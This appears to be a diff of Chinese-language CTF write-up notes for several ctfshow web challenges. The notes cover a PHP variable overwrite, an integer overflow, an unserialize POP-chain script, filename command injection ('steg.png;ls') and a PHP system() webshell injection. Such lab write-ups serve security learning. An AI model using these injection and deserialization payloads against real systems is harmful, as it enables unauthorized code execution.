@@ -71,3 +71,84 @@ $cmd=O:8:"Webshell":1:{s:3:"cmd";s:4:"nl *";}
 给了源码还是得看wp，cmd=awk&param=system("ls")
 
 <mark>有的地方不用双引号不行不知道为什么</mark>
+
+# 遍地飘零
+var_dump($_GET)
+
+尝试把\$flag的值赋给\$_GET
+
+# 茶歇区
+溢出，源码判断数量\*消耗fp值要小于等于剩余fp值，类型为int64，故使得数量\*消耗的fp大于int64的上限变为复数即可，然后再次输入使数量\*消耗fp值\*2的符号位为0，且值大于114514即可
+
+# 小舔田
+php __wakeup()函数在unserialize时被自动调用
+```php
+<?php
+    class Ion_Fan_Princess{
+        public $nickname="小甜甜";
+
+        public function call(){
+            global $flag;
+            if ($this->nickname=="小甜甜"){
+                echo $flag;
+            }else{
+                echo "以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家".$this->nickname."。\n";
+                echo "你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n";
+            }
+        }
+        
+        public function __toString(){
+            $this->call();
+            return "\t\t\t\t\t\t\t\t\t\t----".$this->nickname;
+        }
+    }
+    class Moon{
+        public $name="月亮";
+        public function __toString(){
+            return $this->name;
+        }
+        
+        public function __wakeup(){
+            echo "我是".$this->name."快来赏我";
+        }
+    }
+    // $m->(此处不用加$)name
+    $m = new Moon();
+    $m->name=new Ion_Fan_Princess();
+    $m->name->nickname='小甜甜';
+    echo urlencode(serialize($m));
+?>
+```
+
+# LSB探姬
+源码中直接将文件名拼接到指令中执行，故修改文件名即可，例如：steg.png;ls
+
+# Is_Not_Obfuscate
+## step1
+乱点一通，什么都没发现
+## step2
+F12查看页面,发现有两处注释，第一处看不明白，第二处提到了lip.php,robots.txt
+
+![alt text](/ctfshow/image/image-6.png)
+
+分别查看，发现lib.php什么都不显示，robots.txt有如下内容
+```
+User-agent: *
+Allow: /lib.php$
+Disallow: /lib.php?flag=0
+Disallow: /plugins
+```
+重新查看lib.php$,和index.php没什么不同
+
+不让flag=0，试试flag=1，页面出现了一串字符串
+
+之前的第一处注释中发现action有个值为test，此处看了wp，将action=test和push=urlencode（上面的字符串）
+
+出现了页面源码
+
+发现push提交的命令和‘youyou’拼接后md5加密作为插件名，因此
+```
+push <?php system('ls');?>
+pull md5 encode("<?php system('ls');?>youyou")
+```
+
